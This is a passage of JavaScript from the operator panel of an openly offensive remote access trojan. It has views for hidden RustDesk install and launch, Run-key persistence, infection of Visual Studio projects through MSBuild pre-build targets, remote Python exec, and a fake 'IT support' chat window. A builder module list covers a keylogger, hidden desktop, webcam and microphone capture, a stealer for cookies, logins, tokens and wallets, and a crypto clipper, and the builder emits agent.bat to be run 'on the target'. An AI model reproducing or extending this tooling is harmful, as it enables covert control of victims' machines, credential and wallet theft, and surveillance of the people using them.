      refresh();
    });
    $("#pxStop", v).onclick = (e) => run(e.currentTarget, async () => {
      await cmd("proxy_stop"); toast("Proxy stopped", "ok"); refresh();
    });
    refresh();
    every(() => { if (S.route === "proxy") refresh(); }, 5000);
  },
};

/* ================================================================ rustdesk */
VIEWS.rustdesk = {
  title: "RustDesk",
  sub: "Hidden install, relay configuration and launch",
  render() {
    if (!S.connected) return offlineCard("RustDesk control needs a live agent.");
    return pageHead("RustDesk", "Bring your own installer; nothing is downloaded by the panel.",
      '<button class="btn btn-sm" id="rdRefresh">' + icon("refresh") + ' Status</button>') +
      requireFeature("rustdesk") +
      '<div class="grid grid-2">' +
        '<div class="card"><div class="card-head"><h3>Status</h3></div><div class="card-body" id="rdStatus"><div class="empty">Loading…</div></div></div>' +
        '<div class="card pad form-stack">' +
          '<div class="field"><label>Installer path (on the agent)</label><input class="input mono" id="rdPath" placeholder="C:\\Users\\me\\Downloads\\rustdesk.exe"></div>' +
          '<button class="btn" id="rdInstall">' + icon("download") + ' Silent install</button>' +
          '<div class="divider"></div>' +
          '<div class="field"><label>Relay server</label><input class="input mono" id="rdRelay" placeholder="relay.example.com:21116"></div>' +
          '<div class="field"><label>Public key</label><input class="input mono" id="rdKey" placeholder="base64 key"></div>' +
          '<button class="btn" id="rdConfig">' + icon("settings") + ' Write config</button>' +
          '<div class="divider"></div>' +
          '<label class="check"><input type="checkbox" id="rdHidden" checked><span><b>Launch hidden</b><small>STARTF_USESHOWWINDOW / SW_HIDE</small></span></label>' +
          '<button class="btn btn-primary" id="rdLaunch">' + icon("play") + ' Launch RustDesk</button>' +
        '</div></div>' +
      '<div class="card" style="margin-top:16px"><div class="card-head"><h3>RustDesk2.toml</h3></div>' +
        '<div class="card-body"><pre class="term" id="rdCfg" style="height:220px;margin:0"></pre></div></div>';
  },
  mount(v) {
    const refresh = async () => {
      try {
        const s = await cmd("rustdesk_status");
        $("#rdStatus", v).innerHTML = kv([
          ["Installed", s.installed ? "yes" : "no"],
          ["Executable", s.exe || "—"],
          ["Running", (s.running || []).map((p) => p.name + " (" + p.pid + ")").join(", ") || "no"],
          ["Config", s.config_exists ? s.config : "not written"],
        ]);
        $("#rdCfg", v).textContent = s.config_text || "# no config";
      } catch (e) { $("#rdStatus", v).innerHTML = '<div class="empty">' + esc(e.message) + "</div>"; }
    };
    $("#rdRefresh", v).onclick = (e) => run(e.currentTarget, refresh);
    $("#rdInstall", v).onclick = (e) => run(e.currentTarget, async () => {
      const path = $("#rdPath", v).value.trim();
      if (!path) throw new Error("installer path required");
      const r = await cmd("rustdesk_install", { path }, 320);
      toast("Installer exit code " + r.code, r.code === 0 ? "ok" : "err");
      refresh();
    });
    $("#rdConfig", v).onclick = (e) => run(e.currentTarget, async () => {
      const r = await cmd("rustdesk_configure", { relay: $("#rdRelay", v).value.trim(), key: $("#rdKey", v).value.trim() });
      toast("Config written" + (r.backup ? " (backup kept)" : ""), "ok");
      refresh();
    });
    $("#rdLaunch", v).onclick = (e) => run(e.currentTarget, async () => {
      const r = await cmd("rustdesk_launch", { hidden: $("#rdHidden", v).checked });
      toast("RustDesk started as PID " + r.pid, "ok");
      refresh();
    });
    refresh();
  },
};

/* ============================================================= persistence */
VIEWS.persistence = {
  title: "Persistence",
  sub: "Run key and startup folder",
  render() {
    if (!S.connected) return offlineCard("Persistence needs a live agent.");
    return pageHead("Persistence", "Copy the payload into %APPDATA% and register it.",
      '<button class="btn btn-sm" id="peRefresh">' + icon("refresh") + ' Status</button>') +
      requireFeature("persistence") +
      '<div class="grid grid-2">' +
        '<div class="card"><div class="card-head"><h3>State</h3><div class="right"><span class="badge" id="peBadge">—</span></div></div>' +
          '<div class="card-body" id="peState"><div class="empty">Loading…</div></div></div>' +
        '<div class="card pad form-stack">' +
          '<label class="check"><input type="checkbox" id="peFolder"><span><b>Also write startup folder shortcut</b><small>%APPDATA%\\…\\Startup\\ChongaAgent.cmd</small></span></label>' +
          '<button class="btn btn-primary" id="peInstall">' + icon("anchor") + ' Install persistence</button>' +
          '<button class="btn btn-danger" id="peRemove">' + icon("trash") + ' Remove persistence</button>' +
          '<div class="note warn">' + icon("alert") + '<div>This modifies HKCU\\Run on the agent host. Remove it before deleting the build folder.</div></div>' +
        '</div></div>';
  },
  mount(v) {
    const refresh = async () => {
      try {
        const s = await cmd("persist_status");
        $("#peBadge", v).textContent = s.active ? "active" : "inactive";
        $("#peBadge", v).className = "badge " + (s.active ? "ok" : "");
        $("#peState", v).innerHTML = kv([
          ["Run key", s.run_key || "—"],
          ["Folder", s.folder || "—"],
          ["Active", s.active ? "yes" : "no"],
        ]);
      } catch (e) { $("#peState", v).innerHTML = '<div class="empty">' + esc(e.message) + "</div>"; }
    };
    $("#peRefresh", v).onclick = (e) => run(e.currentTarget, refresh);
    $("#peInstall", v).onclick = (e) => run(e.currentTarget, async () => {
      const r = await cmd("persist_install", { startup_folder: $("#peFolder", v).checked }, 40);
      toast("Persistence installed", "ok");
      $("#peState", v).innerHTML = kv([["Command", r.installed, true], ["Path", r.path, true]]);
      later(refresh, 600);
    });
    $("#peRemove", v).onclick = (e) => run(e.currentTarget, async () => {
      const r = await cmd("persist_remove", {}, 40);
      toast("Removed: " + ((r.removed || []).join(", ") || "nothing found"), "ok");
      refresh();
    });
    refresh();
  },
};

/* ============================================================= propagation */
VIEWS.propagation = {
  title: "Propagation",
  sub: "Visual Studio project infection with backups",
  render() {
    if (!S.connected) return offlineCard("Propagation needs a live agent.");
    return pageHead("Propagation", "Injects an MSBuild pre-build target into .csproj/.vcxproj files.",
      '<button class="btn btn-sm" id="prClean">' + icon("refresh") + ' Clean</button>') +
      requireFeature("propagation") +
      '<div class="grid" style="grid-template-columns:minmax(0,1fr) 340px">' +
        '<div class="card"><div class="card-head"><h3>Result</h3></div><div class="card-body" id="prOut"><div class="empty">Nothing run yet.</div></div></div>' +
        '<div class="card pad form-stack">' +
          '<div class="field"><label>Root directory</label><input class="input mono" id="prRoot" placeholder="C:\\Projects"></div>' +
          '<div class="form-row"><div class="field"><label>Max depth</label><input class="input" id="prDepth" type="number" value="4" min="1" max="8"></div>' +
            '<div class="field"><label>Max projects</label><input class="input" id="prLimit" type="number" value="100" min="1" max="500"></div></div>' +
          '<label class="check"><input type="checkbox" id="prConfirm"><span><b>I understand this edits project files</b><small>Every modified project keeps a .kryvexol.bak</small></span></label>' +
          '<button class="btn btn-primary" id="prInfect">' + icon("branch") + ' Infect projects</button>' +
          '<div class="note danger">' + icon("alert") + '<div>Scope is limited to the root you supply. Nothing walks the whole disk.</div></div>' +
        '</div></div>';
  },
  mount(v) {
    const report = (r) => {
      $("#prOut", v).innerHTML =
        '<div class="hstack" style="margin-bottom:12px"><span class="badge ok">' + (r.infected || r.restored || []).length + " changed</span>" +
        '<span class="badge">' + (r.skipped || r.targets_removed || []).length + " skipped</span>" +
        '<span class="badge bad">' + (r.failed || []).length + " failed</span></div>" +
        ((r.infected && r.infected.length) ? '<div class="stat-label" style="margin:8px 0 4px">Infected</div>' +
          r.infected.map((x) => '<div class="mono small" style="padding:2px 0">' + esc(x) + "</div>").join("") : "") +
        ((r.restored && r.restored.length) ? '<div class="stat-label" style="margin:8px 0 4px">Restored</div>' +
          r.restored.map((x) => '<div class="mono small" style="padding:2px 0">' + esc(x) + "</div>").join("") : "") +
        ((r.failed && r.failed.length) ? '<div class="stat-label" style="margin:8px 0 4px">Failed</div>' +
          r.failed.map((x) => '<div class="mono small" style="color:var(--red)">' + esc(x.project || x) + " — " + esc(x.error || "") + "</div>").join("") : "");
    };
    $("#prInfect", v).onclick = (e) => run(e.currentTarget, async () => {
      const root = $("#prRoot", v).value.trim();
      if (!root) throw new Error("root required");
      if (!$("#prConfirm", v).checked) throw new Error("tick the confirmation box first");
      const r = await cmd("vs_infect", {
        root, confirm: true,
        depth: Number($("#prDepth", v).value) || 4,
        limit: Number($("#prLimit", v).value) || 100,
      }, 120);
      report(r);
      toast("Infected " + r.count + " project(s)", "ok");
    });
    $("#prClean", v).onclick = (e) => run(e.currentTarget, async () => {
      const root = $("#prRoot", v).value.trim();
      if (!root) throw new Error("root required");
      if (!await confirmBox("Clean projects", "Restore every .kryvexol.bak under " + root + "?", false)) return;
      const r = await cmd("vs_clean", { root, confirm: true }, 120);
      report(r);
      toast("Restored " + r.restored.length + " project(s)", "ok");
    });
  },
};

/* ================================================================= plugins */
VIEWS.plugins = {
  title: "Plugins",
  sub: "Push Python modules into the agent at runtime",
  render() {
    if (!S.connected) return offlineCard("The plugin host needs a live agent.");
    return pageHead("Plugin host", "A module registers a COMMANDS dict; the panel calls into it.",
      '<button class="btn btn-sm" id="plRefresh">' + icon("refresh") + ' Loaded</button>') +
      requireFeature("plugins") +
      '<div class="grid" style="grid-template-columns:minmax(0,1fr) 380px">' +
        '<div class="card"><div class="card-head"><h3>Loaded plugins</h3><div class="right"><span class="badge" id="plCount">0</span></div></div>' +
          '<div class="card-body flush" id="plList"><div class="empty">None loaded.</div></div>' +
          '<div class="card-head" style="border-top:1px solid var(--line)"><h3>Run Python</h3><p>exec() inside the agent</p></div>' +
          '<div class="card-body form-stack"><textarea class="textarea" id="plCode" style="min-height:130px">result = {"pid": __import__("os").getpid()}</textarea>' +
            '<div class="hstack"><button class="btn btn-primary btn-sm" id="plRun">' + icon("play") + ' Execute</button><span class="small muted" id="plOut"></span></div></div></div>' +
        '<div class="card pad form-stack">' +
          '<div class="field"><label>Name</label><input class="input" id="plName" placeholder="hello"></div>' +
          '<div class="field"><label>Source</label><textarea class="textarea" id="plSrc" style="min-height:200px">def hello(args):\n    return {"echo": args, "pid": __import__("os").getpid()}\n\nCOMMANDS = {"hello": hello}\n</textarea></div>' +
          '<button class="btn btn-primary" id="plLoad">' + icon("upload") + ' Push plugin</button>' +
          '<div class="note">' + icon("info") + '<div>Call it from the table, or with <span class="mono">plugin_call</span>.</div></div>' +
        '</div></div>';
  },
  mount(v) {
    const paint = (rows) => {
      S.plugins.rows = rows;
      $("#plCount", v).textContent = rows.length;
      $("#plList", v).innerHTML = table(["Name", "Commands", "Loaded", ""], rows, (p) =>
        '<tr><td>' + esc(p.name) + '</td><td class="mono small">' + esc((p.commands || []).join(", ")) +
        '</td><td class="small muted">' + esc(p.loaded) + "</td><td>" +
        '<button class="btn btn-sm" data-call="' + esc(p.name) + '">Call</button> ' +
        '<button class="btn btn-sm btn-danger" data-unload="' + esc(p.name) + '">Unload</button></td></tr>', "No plugins loaded.");
      $$("[data-call]", v).forEach((b) => b.onclick = () => {
        const p = rows.find((x) => x.name === b.dataset.call);
        const cmds = (p && p.commands) || [];
        const m = modal("Call " + b.dataset.call,
          '<div class="form-stack"><div class="field"><label>Command</label><select class="select" id="pcCmd">' +
          cmds.map((c) => "<option>" + esc(c) + "</option>").join("") + "</select></div>" +
          '<div class="field"><label>Arguments (JSON)</label><textarea class="textarea" id="pcArgs">{}</textarea></div>' +
          '<pre class="term" id="pcOut" style="height:140px;margin:0">—</pre></div>',
          '<button class="btn btn-primary" data-ok>Run</button>');
        $("[data-ok]", m.el).onclick = async (ev) => {
          busy(ev.currentTarget, true);
          try {
            const args = JSON.parse($("#pcArgs", m.el).value || "{}");
            const r = await cmd("plugin_call", { name: b.dataset.call, command: $("#pcCmd", m.el).value, args }, 30);
            $("#pcOut", m.el).textContent = JSON.stringify(r.result, null, 2);
          } catch (e) { $("#pcOut", m.el).textContent = e.message; }
          busy(ev.currentTarget, false);
        };
      });
      $$("[data-unload]", v).forEach((b) => b.onclick = (e) => run(e.currentTarget, async () => {
        await cmd("plugin_unload", { name: b.dataset.unload });
        toast("Unloaded", "ok");
        load();
      }));
    };
    const load = async () => {
      try { const r = await cmd("plugin_list"); paint(r.plugins || []); }
      catch (e) { $("#plList", v).innerHTML = '<div class="empty">' + esc(e.message) + "</div>"; }
    };
    $("#plLoad", v).onclick = (e) => run(e.currentTarget, async () => {
      const name = $("#plName", v).value.trim();
      const source = $("#plSrc", v).value;
      if (!source.trim()) throw new Error("source required");
      const r = await cmd("plugin_load", { name, source: source }, 30);
      toast("Plugin " + r.name + " loaded", "ok");
      load();
    });
    $("#plRun", v).onclick = (e) => run(e.currentTarget, async () => {
      const r = await cmd("code_run", { code: $("#plCode", v).value }, 40);
      $("#plOut", v).textContent = (r.stdout || "") + (r.result || "");
    });
    $("#plRefresh", v).onclick = (e) => run(e.currentTarget, load);
    load();
  },
};

/* ================================================================= actions */
VIEWS.actions = {
  title: "Actions",
  sub: "Power, prompts, speech and session control",
  render() {
    if (!S.connected) return offlineCard("Actions need a live agent.");
    return pageHead("Actions", "Direct system operations on the agent host.", "") +
      '<div class="grid grid-2">' +
        '<div class="card"><div class="card-head"><h3>Power</h3></div><div class="card-body">' +
          '<div class="btn-row"><button class="btn" data-power="lock">' + icon("lock") + ' Lock</button>' +
          '<button class="btn" data-power="logoff">' + icon("power") + ' Log off</button>' +
          '<button class="btn btn-danger" data-power="restart">' + icon("refresh") + ' Restart</button>' +
          '<button class="btn btn-danger" data-power="shutdown">' + icon("power") + ' Shut down</button></div></div></div>' +
        '<div class="card"><div class="card-head"><h3>Desktop</h3></div><div class="card-body">' +
          '<div class="btn-row"><button class="btn" id="acMask">' + icon("eye") + ' Mask</button>' +
          '<button class="btn" id="acLift">' + icon("eye") + ' Lift</button>' +
          '<button class="btn" id="acBeep">' + icon("zap") + ' Beep</button></div>' +
          '<div class="hstack" style="margin-top:10px"><span class="small muted">Idle</span><span class="badge" id="acIdle">—</span></div></div></div>' +
        '<div class="card"><div class="card-head"><h3>Message box</h3></div><div class="card-body form-stack">' +
          '<div class="field"><label>Caption</label><input class="input" id="acCap" value="IT support"></div>' +
          '<div class="field"><label>Text</label><input class="input" id="acText" placeholder="Your session needs attention."></div>' +
          '<button class="btn" id="acMsg">' + icon("message") + ' Show message box</button></div></div>' +
        '<div class="card"><div class="card-head"><h3>Text to speech</h3></div><div class="card-body form-stack">' +
          '<div class="field"><label>Text</label><input class="input" id="acTts" placeholder="This machine is being monitored."></div>' +
          '<button class="btn" id="acSpeak">' + icon("speaker") + ' Speak</button></div></div>' +
        '<div class="card"><div class="card-head"><h3>Operator status</h3></div><div class="card-body form-stack">' +
          '<div class="form-row"><div class="field"><label>Status</label><select class="select" id="acStatus">' +
            ["online", "busy", "away", "maintenance"].map((s) => "<option>" + s + "</option>").join("") + "</select></div>" +
            '<div class="field"><label>Note</label><input class="input" id="acNote" placeholder="optional"></div></div>' +
          '<button class="btn" id="acSetStatus">Set status</button></div></div>' +
        '<div class="card"><div class="card-head"><h3>Session</h3></div><div class="card-body">' +
          '<div class="btn-row"><button class="btn" id="acPurge">' + icon("trash") + ' Purge temp</button>' +
          '<button class="btn" id="acRetry">' + icon("refresh") + ' Reconnect</button>' +
          '<button class="btn btn-danger" id="acClose">' + icon("x") + ' Close connection</button>' +
          '<button class="btn btn-danger" id="acKill">' + icon("alert") + ' Terminate agent</button></div>' +
          '<div class="note danger" style="margin-top:10px">' + icon("alert") + '<div>Terminate removes persistence and exits the agent process.</div></div></div></div>' +
      '</div>';
  },
  mount(v) {
    $$("[data-power]", v).forEach((b) => b.onclick = async () => {
      const action = b.dataset.power;
      if (action !== "lock" && !await confirmBox("Power action", "Send " + action + " to the agent host?", true)) return;
      run(b, async () => {
        await cmd("power", { action });
        toast("Power action sent: " + action, "ok");
      });
    });
    $("#acMask", v).onclick = (e) => run(e.currentTarget, async () => { await cmd("mask"); toast("Masked", "ok"); });
    $("#acLift", v).onclick = (e) => run(e.currentTarget, async () => { await cmd("lift"); toast("Lifted", "ok"); });
    $("#acBeep", v).onclick = (e) => run(e.currentTarget, async () => { await cmd("audio", { op: "beep" }); toast("Beep", "ok"); });
    $("#acMsg", v).onclick = (e) => run(e.currentTarget, async () => {
      await cmd("messagebox", { text: $("#acText", v).value, caption: $("#acCap", v).value });
      toast("Message box shown", "ok");
    });
    $("#acSpeak", v).onclick = (e) => run(e.currentTarget, async () => {
      const text = $("#acTts", v).value.trim();
      if (!text) throw new Error("text required");
      await cmd("tts", { text });
      toast("Speaking", "ok");
    });
    $("#acSetStatus", v).onclick = (e) => run(e.currentTarget, async () => {
      await cmd("set_status", { status: $("#acStatus", v).value, note: $("#acNote", v).value });
      toast("Status updated", "ok");
    });
    $("#acPurge", v).onclick = (e) => run(e.currentTarget, async () => {
      const r = await cmd("purge");
      toast("Purged " + bytes(r.bytes || 0), "ok");
    });
    $("#acRetry", v).onclick = (e) => run(e.currentTarget, async () => {
      await cmd("retry"); toast("Agent reconnecting", "ok");
    });
    $("#acClose", v).onclick = async (e) => {
      if (!await confirmBox("Close connection", "The agent will stop reconnecting until it is restarted.", true)) return;
      run(e.currentTarget, async () => { await cmd("close_connection"); toast("Connection closed", "ok"); });
    };
    $("#acKill", v).onclick = async (e) => {
      if (!await confirmBox("Terminate agent", "Remove persistence and exit the agent process?", true)) return;
      run(e.currentTarget, async () => { await cmd("bot_kill"); toast("Agent terminating", "ok"); });
    };
    cmd("idle").then((r) => { const el = $("#acIdle", v); if (el) el.textContent = dur(r.idle || 0); }).catch(() => {});
  },
};

/* ==================================================================== chat */
VIEWS.chat = {
  title: "Chat",
  sub: "Support window on the agent desktop",
  render() {
    if (!S.connected) return offlineCard("Chat needs a live agent.");
    return pageHead("Chat window", "A topmost Tk window titled “IT support” on the agent.",
      '<button class="btn btn-sm btn-primary" id="chOpen">' + icon("message") + ' Open window</button>' +
      '<button class="btn btn-sm" id="chClose">' + icon("x") + ' Close</button>') +
      requireFeature("chat") +
      '<div class="card chat-shell"><div class="chat-log" id="chatLog"></div>' +
        '<div class="chat-input"><input class="input" id="chatInput" placeholder="Message the logged-in user…">' +
        '<button class="btn btn-primary" id="chatSend">Send</button></div></div>';
  },
  mount(v) {
    paintChat();
    const send = async () => {
      const input = $("#chatInput", v);
      const text = input.value.trim();
      if (!text) return;
      try {
        await cmd("chat_send", { text });
        S.chat.messages.push({ who: "operator", text, ts: Date.now() / 1000 });
        input.value = "";
        paintChat();
      } catch (e) { fail(e); }
    };
    $("#chatSend", v).onclick = (e) => run(e.currentTarget, send);
    $("#chatInput", v).addEventListener("keydown", (e) => { if (e.key === "Enter") send().catch(fail); });
    $("#chOpen", v).onclick = (e) => run(e.currentTarget, async () => {
      const r = await cmd("chat", { text: "Hello. This is IT support." });
      S.chat.open = true;
      toast(r.already ? "Window is already open" : "Chat window opened", "ok");
      if (!S.chat.messages.length) {
        S.chat.messages.push({ who: "operator", text: "Hello. This is IT support.", ts: Date.now() / 1000 });
        paintChat();
      }
    });
    $("#chClose", v).onclick = (e) => run(e.currentTarget, async () => {
      await cmd("chat_close");
      S.chat.open = false;
      toast("Chat window closed", "ok");
    });
  },
};

function paintChat() {
  const log = $("#chatLog");
  if (!log) return;
  log.innerHTML = S.chat.messages.length ? S.chat.messages.map((m) =>
    '<div class="bubble ' + (m.who === "operator" ? "operator" : "agent") + '">' +
    '<span class="who">' + (m.who === "operator" ? "operator" : "user") + " · " + esc(timeOf(m.ts)) + "</span>" +
    esc(m.text) + "</div>").join("") :
    '<div class="empty">' + icon("message") + "No messages yet. Open the window to start.</div>";
  log.scrollTop = log.scrollHeight;
}

/* ================================================================= builder */
const FEATURE_INFO = {
  screen: ["Remote desktop", "JPEG screen frames and monitor list"],
  input: ["Input injection", "Absolute mouse and unicode keys"],
  files: ["File manager", "Browse, transfer, hash and search"],
  processes: ["Processes", "List, start and terminate"],
  shell: ["Shell", "cmd.exe, ShellExecute, detached launch"],
  registry: ["Registry", "Browse and edit hives"],
  clipboard: ["Clipboard", "Read and write text"],
  keylog: ["Keylogger", "Buffered keystrokes"],
  audio: ["Audio", "Beep, play and stop WAV"],
  tts: ["Text to speech", "System.Speech on the host"],
  power: ["Power", "Lock, log off, restart, shut down"],
  messagebox: ["Message box", "Native dialog"],
  chat: ["Chat", "Tk support window"],
  windows: ["Windows", "Visible windows, idle, mask/lift"],
  hvnc: ["HVNC", "Hidden desktop with compositing"],
  webcam: ["Webcam", "DirectShow frames"],
  mic: ["Microphone", "16 kHz WAV capture"],
  desktop_audio: ["Desktop audio", "Loopback WAV capture"],
  stealer: ["Stealer", "Cookies, logins, tokens, wallets"],
  recon: ["Recon", "Connections, geo, recycle bin"],
  persistence: ["Persistence", "Run key and startup folder"],
  propagation: ["Propagation", "MSBuild project infection"],
  proxy: ["Tunnel & proxy", "TCP relay and SOCKS5 listener"],
  plugins: ["Plugins", "Runtime Python modules and code_run"],
  rustdesk: ["RustDesk", "Status, install, configure, launch"],
  clipper: ["Clipper", "Crypto address substitution"],
  control: ["Control", "Status, purge, retry, terminate"],
};

VIEWS.builder = {
  title: "Builder",
  sub: "Build a client · it appears under Clients once it connects",
  render() {
    const feats = Object.keys(FEATURE_INFO);
    return pageHead("Agent builder", "The token is embedded at build time. Each client keeps its own id and feature set.", "") +
      '<div class="grid" style="grid-template-columns:minmax(0,1fr) 340px">' +
        '<div class="card"><div class="card-head"><h3>Modules</h3><div class="right">' +
          '<button class="btn btn-sm btn-ghost" id="bdAll">All</button>' +
          '<button class="btn btn-sm btn-ghost" id="bdNone">None</button>' +
          '<span class="badge violet" id="bdCount">' + feats.length + '</span></div></div>' +
          '<div class="card-body"><div class="grid grid-3" id="bdFeats">' +
            feats.map((f) => '<label class="check on" data-feat="' + f + '"><input type="checkbox" checked>' +
              "<span><b>" + esc(FEATURE_INFO[f][0]) + "</b><small>" + esc(FEATURE_INFO[f][1]) + "</small></span></label>").join("") +
          "</div></div></div>" +
        '<div class="stack"><div class="card pad form-stack">' +
          '<div class="field"><label>Label</label><input class="input" id="bdLabel" value="local"></div>' +
          '<div class="field"><label>Panel host</label><input class="input mono" id="bdHost" value="127.0.0.1" placeholder="127.0.0.1">' +
            '<div class="small muted" style="margin-top:5px">' +
            (S.lan
              ? "This PC answers on <span class=\"mono\">" + esc(S.lanIp) + "</span> — type it here for agents on other machines."
              : "Stays <span class=\"mono\">127.0.0.1</span> for this PC. Set <span class=\"mono\">PANEL_BIND</span> / <span class=\"mono\">AGENT_BIND</span> to 0.0.0.0, then type this PC's LAN address here.") +
            "</div></div>" +
          '<label class="check"><input type="checkbox" id="bdRotate"><span><b>Rotate token</b><small>Invalidates every existing build</small></span></label>' +
          '<label class="check"><input type="checkbox" id="bdExe"><span><b>Also try PyInstaller</b><small>Optional; needs PyInstaller installed</small></span></label>' +
          '<button class="btn btn-primary" id="bdBuild">' + icon("box") + ' Build agent</button>' +
          '<div class="note">' + icon("info") + '<div>One file: <b>agent.bat</b>. Drop it on the target and double-click — it unpacks itself, starts, and the client appears under <b>Clients</b>.</div></div>' +
        "</div><div class=\"card\"><div class=\"card-head\"><h3>Output</h3></div><div class=\"card-body\" id=\"bdOut\">" +
          '<div class="empty">No build yet.</div></div></div></div>' +
      '</div>';
  },
  mount(v) {
    const sync = () => {
      let n = 0;
      $$("[data-feat]", v).forEach((l) => {
        const on = $("input", l).checked;
        l.classList.toggle("on", on);
        if (on) n++;
      });
      $("#bdCount", v).textContent = n;
    };
    $$("[data-feat] input", v).forEach((cb) => cb.onchange = sync);
    $("#bdAll", v).onclick = () => { $$("[data-feat] input", v).forEach((cb) => { cb.checked = true; }); sync(); };
    $("#bdNone", v).onclick = () => { $$("[data-feat] input", v).forEach((cb) => { cb.checked = false; }); sync(); };
    $("#bdBuild", v).onclick = async (e) => {
      const features = $$("[data-feat]", v).filter((l) => $("input", l).checked).map((l) => l.dataset.feat);
      if (!features.length) return toast("Select at least one module", "err");
      if ($("#bdRotate", v).checked) {
        if (!await confirmBox("Rotate token", "Every agent already built will be rejected until rebuilt.", true)) return;
      }
      run(e.currentTarget, async () => {
        const r = await api("/api/builder", {
          method: "POST", headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            features, label: $("#bdLabel", v).value,
            host: $("#bdHost", v).value.trim() || "127.0.0.1",
            rotate: $("#bdRotate", v).checked, exe: $("#bdExe", v).checked,
          }),
        });
        if (!r.ok) throw new Error(r.error || "build failed");
        S.builder.result = r;
        $("#bdOut", v).innerHTML =
          '<div class="hstack" style="margin-bottom:10px"><span class="badge ok">built</span>' +
          '<span class="badge">' + r.features.length + " modules</span>" +
          '<span class="badge violet">one file</span>' +
          (r.exe ? '<span class="badge violet">exe</span>' : "") + "</div>" +
          kv([["Archive", r.file], ["Single file", r.bat || "agent.bat"], ["Panel host", r.host || $("#bdHost", v).value.trim()], ["Token", r.token], ["Modules", r.features.join(", ")]]) +
          '<div class="btn-row" style="margin-top:12px"><a class="btn btn-primary btn-sm" href="' + esc(r.batUrl || r.url) + '?token=' + encodeURIComponent(S.token) + '">' + icon("download") + " Download agent.bat</a>" +
          '<a class="btn btn-sm" href="' + esc(r.url) + '?token=' + encodeURIComponent(S.token) + '">' + icon("box") + " Zip</a>" +
          '<button class="btn btn-sm" id="bdCopyTok">Copy token prefix</button>' +
          '<button class="btn btn-sm" id="bdClients">' + icon("radar") + " Clients</button></div>" +
          '<div class="note" style="margin-top:10px">' + icon("info") + "<div><b>agent.bat</b> is the whole thing — double-click it on the target. It needs a Python 3 there (pythonw, python or the py launcher).</div></div>" +
          (r.exeError ? '<div class="note warn" style="margin-top:10px">' + icon("alert") + "<div>PyInstaller failed: " + esc(r.exeError) + "</div></div>" : "");
        $("#bdCopyTok", v).onclick = () => copyText(r.token);
        $("#bdClients", v).onclick = () => go("clients");
        toast("Built " + r.file, "ok");
      });
    };
    sync();
  },
};

/* ================================================================ settings */
VIEWS.settings = {
  title: "Settings",
  sub: "Session, transport and boundaries",
  render() {
    const i = S.info || {};
    return pageHead("Settings", "Panel-wide settings plus the selected client.", "") +
      '<div class="grid grid-2">' +
        '<div class="card"><div class="card-head"><h3>Panel</h3></div><div class="card-body">' +
          kv([["Panel URL", "http://" + location.host + "/"],
            ["Agent listener", "tcp " + (S.lan ? S.lanIp : (location.hostname || "127.0.0.1")) + ":" + (S.agentPort || 8790)],
            ["Bind mode", S.lan ? "LAN (" + (S.lanIp || "?") + ")" : "loopback only"],
            ["Clients attached", String(S.clients.length)],
            ["Selected client", i.hostname || "—"],
            ["Session", S.connected ? "connected" : "offline"],
            ["Agent address", i.hostname ? (i.hostname + " · " + (i.username || "?")) : "—"],
            ["Modules", String(S.features.length || 0)],
            ["Transport", "NDJSON over TCP + token"],
            ["Panel auth", "X-Panel-Token"]]) +
        '</div></div>' +
        '<div class="card"><div class="card-head"><h3>Token</h3></div><div class="card-body">' +
          '<div class="field"><label>Current token</label><div class="hstack">' +
            '<input class="input mono" id="setTok" type="password" value="' + esc(S.token) + '" readonly>' +
            '<button class="btn btn-icon" id="setEye">' + icon("eye") + "</button>" +
            '<button class="btn btn-icon" id="setCopy">' + icon("copy") + "</button></div></div>" +
          '<div class="note" style="margin-top:12px">' + icon("shield") + '<div>The token is stored in <span class="mono">runtime/token.txt</span>. Rotating it in the Builder invalidates existing agents.</div></div>' +
        '</div></div>' +
        '<div class="card"><div class="card-head"><h3>Boundaries</h3></div><div class="card-body">' +
          '<div class="note">' + icon("info") + '<div><b>Per-client routing.</b> Every command carries the selected client id. Nothing is broadcast to the other attached machines.</div></div>' +
          '<div class="note" style="margin-top:8px">' + icon("lock") + '<div><b>' + (S.lan ? "LAN mode." : "Loopback by default.") + '</b> ' +
            (S.lan
              ? "Other PCs reach this panel on <span class=\"mono\">" + esc(S.lanIp) + ":" + esc(S.httpPort || 8787) + "</span>; agents dial <span class=\"mono\">" + esc(S.lanIp) + ":" + esc(S.agentPort || 8790) + "</span>. The token is still required."
              : "The panel and agent listeners bind 127.0.0.1 unless <span class=\"mono\">PANEL_BIND</span> / <span class=\"mono\">AGENT_BIND</span> are set, and the token is still required.") + "</div></div>" +
          '<div class="note warn" style="margin-top:8px">' + icon("alert") + '<div><b>State-changing modules</b> (persistence, propagation, plugins, RustDesk) only exist in builds that selected them.</div></div>' +
        "</div></div>" +
        '<div class="card"><div class="card-head"><h3>Danger zone</h3></div><div class="card-body">' +
          '<div class="btn-row"><button class="btn btn-danger" id="setPurge">' + icon("trash") + " Purge agent temp</button>" +
          '<button class="btn btn-danger" id="setRetry">' + icon("refresh") + " Reconnect agent</button>" +
          '<button class="btn btn-danger" id="setKill">' + icon("alert") + " Terminate agent</button></div>" +
          '<p class="small muted" style="margin:10px 0 0">Terminate removes persistence entries and exits the agent process.</p>' +
        "</div></div>" +
      "</div>";
  },
  mount(v) {
    const tok = $("#setTok", v);
    $("#setEye", v).onclick = () => { tok.type = tok.type === "password" ? "text" : "password"; };
    $("#setCopy", v).onclick = () => copyText(S.token);
    $("#setPurge", v).onclick = (e) => run(e.currentTarget, async () => { await cmd("purge"); toast("Purged", "ok"); });
    $("#setRetry", v).onclick = (e) => run(e.currentTarget, async () => { await cmd("retry"); toast("Reconnecting", "ok"); });
    $("#setKill", v).onclick = async (e) => {
      if (!await confirmBox("Terminate agent", "Remove persistence and exit the agent?", true)) return;
      run(e.currentTarget, async () => { await cmd("bot_kill"); toast("Terminating", "ok"); });
    };
  },
};

/* ----------------------------------------------------------------- boot -- */
async function boot() {
  try {
    const cfg = await api("/api/config");
    S.token = cfg.token || "";
    S.httpPort = cfg.httpPort || 0;
    S.agentPort = cfg.agentPort || 0;
    S.lanIp = cfg.lanIp || "";
    S.lan = !!cfg.lan;
  } catch (e) {
    $("#view").innerHTML = '<div class="note danger">' + icon("alert") +
      "<div>Cannot reach the local panel API. Start <b>start-panel.bat</b> and reload.</div></div>";
    return;
  }
  try { await state(); } catch (e) { /* page still renders */ }
  S.wasConnected = S.connected;
  connectSSE();
  const id = (location.hash || "").replace(/^#\/?/, "") || "builder";
  S.route = VIEWS[id] ? id : "builder";
  render();

  $("#menuBtn").addEventListener("click", () => $("#sidebar").classList.toggle("open"));
  window.addEventListener("hashchange", () => {
